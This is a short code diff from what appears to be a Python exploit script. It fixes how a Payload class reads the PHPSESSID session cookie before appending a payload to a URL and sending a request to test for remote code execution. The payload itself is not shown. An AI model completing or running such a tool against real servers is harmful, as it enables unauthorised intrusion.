@@ -131,7 +131,7 @@ class Payload:
 		for cookie in cookies:
 			if 'phpsessid' in cookie.lower():
 				# it gets the value of the cookie
-				value = session.cookies[i]
+				value = session.cookies[cookie]
 				#send the payload to see if there is RCE
 				newUrl = self.url + self.payload
 				s.get(newUrl, headers=fetchUA())
